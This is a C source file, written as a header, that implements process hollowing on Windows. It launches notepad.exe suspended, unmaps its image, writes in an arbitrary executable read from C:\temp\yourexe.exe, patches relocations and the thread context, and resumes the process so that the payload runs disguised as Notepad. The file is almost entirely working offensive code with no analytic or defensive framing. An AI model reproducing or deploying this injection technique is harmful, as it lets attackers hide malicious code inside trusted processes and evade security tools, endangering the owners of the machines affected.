#pragma once

#include <Windows.h>
#include <stdio.h>

// Macros
#define DEREF(name) *(UINT_PTR *)(name)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define STATUS_SUCCESS 0x00000000
#define OBJ_CASE_INSENSITIVE 0x00000040L

// Type definitions
typedef LONG KPRIORITY;
typedef long NTSTATUS;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  pBuffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitObjectAttr(pObjAttr, name, attr, root, secDesc) \
    { (pObjAttr)->Length = sizeof(OBJECT_ATTRIBUTES); \
      (pObjAttr)->RootDirectory = root; \
      (pObjAttr)->Attributes = attr; \
      (pObjAttr)->ObjectName = name; \
      (pObjAttr)->SecurityDescriptor = secDesc; \
      (pObjAttr)->SecurityQualityOfService = NULL; }

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0
} PROCESSINFOCLASS;

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

typedef NTSTATUS(NTAPI* _ZwUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

void SafeMemcpy(void* dst, const void* src, size_t n) {
    if (!dst || !src || n == 0) return;
    char* d = (char*)dst;
    const char* s = (const char*)src;
    while (n--) *d++ = *s++;
}

void ApplyRelocations(HANDLE hProcess, BYTE* localImage, PIMAGE_NT_HEADERS ntHeader, PIMAGE_SECTION_HEADER secHeaders, PVOID remoteBase, DWORD delta) {
    IMAGE_DATA_DIRECTORY relocDir = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; ++i) {
        if (memcmp(secHeaders[i].Name, ".reloc", 6) == 0) {
            DWORD offset = 0;
            DWORD relocVA = secHeaders[i].PointerToRawData;

            while (offset < relocDir.Size) {
                PBASE_RELOCATION_BLOCK block = (PBASE_RELOCATION_BLOCK)(localImage + relocVA + offset);
                offset += sizeof(BASE_RELOCATION_BLOCK);
                DWORD entryCount = (block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
                PBASE_RELOCATION_ENTRY entries = (PBASE_RELOCATION_ENTRY)(localImage + relocVA + offset);

                for (DWORD j = 0; j < entryCount; ++j) {
                    offset += sizeof(BASE_RELOCATION_ENTRY);
                    if (entries[j].Type == 0) continue;
                    DWORD patchRVA = block->PageAddress + entries[j].Offset;
                    DWORD patchedAddr = 0;
                    SIZE_T read;

                    ReadProcessMemory(hProcess, (BYTE*)remoteBase + patchRVA, &patchedAddr, sizeof(DWORD), &read);
                    patchedAddr += delta;
                    WriteProcessMemory(hProcess, (BYTE*)remoteBase + patchRVA, &patchedAddr, sizeof(DWORD), NULL);
                }
            }
            break;
        }
    }
}

int main() {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_INTEGER;

    // Start a suspended notepad.exe process
    const char* targetPath = "C:\\Windows\\System32\\notepad.exe";
    if (!CreateProcessA(NULL, (LPSTR)targetPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to start process.\n");
        return -1;
    }

    // Get PEB base address of the remote process
    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    DWORD outLen = 0;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &outLen);

    // Read image base address from PEB
    PVOID imageBase = 0;
    ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 8, &imageBase, sizeof(PVOID), NULL);

    // Unmap the original image
    _ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwUnmapViewOfSection");
    ZwUnmapViewOfSection(pi.hProcess, imageBase);

    // Load the payload from disk
    HANDLE hFile = CreateFileA("C:\\temp\\yourexe.exe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    DWORD size = GetFileSize(hFile, NULL);
    BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    ReadFile(hFile, buffer, size, NULL, NULL);
    CloseHandle(hFile);

    // Parse PE headers
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(buffer + dos->e_lfanew);

    // Allocate memory in target process
    PVOID remoteImage = VirtualAllocEx(pi.hProcess, (LPVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Write headers to remote process
    WriteProcessMemory(pi.hProcess, remoteImage, buffer, nt->OptionalHeader.SizeOfHeaders, NULL);

    // Write each section to the remote process
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        PVOID dest = (PBYTE)remoteImage + section[i].VirtualAddress;
        PVOID src = buffer + section[i].PointerToRawData;
        WriteProcessMemory(pi.hProcess, dest, src, section[i].SizeOfRawData, NULL);
    }

    // Apply relocations if necessary
    DWORD delta = (DWORD)((DWORD_PTR)remoteImage - nt->OptionalHeader.ImageBase);
    ApplyRelocations(pi.hProcess, buffer, nt, section, remoteImage, delta);

    // Set entry point and resume execution
    GetThreadContext(pi.hThread, &ctx);
    ctx.Eax = (DWORD)((DWORD_PTR)remoteImage + nt->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    printf("[+] Process hollowing completed successfully.\n");
    return 0;
}
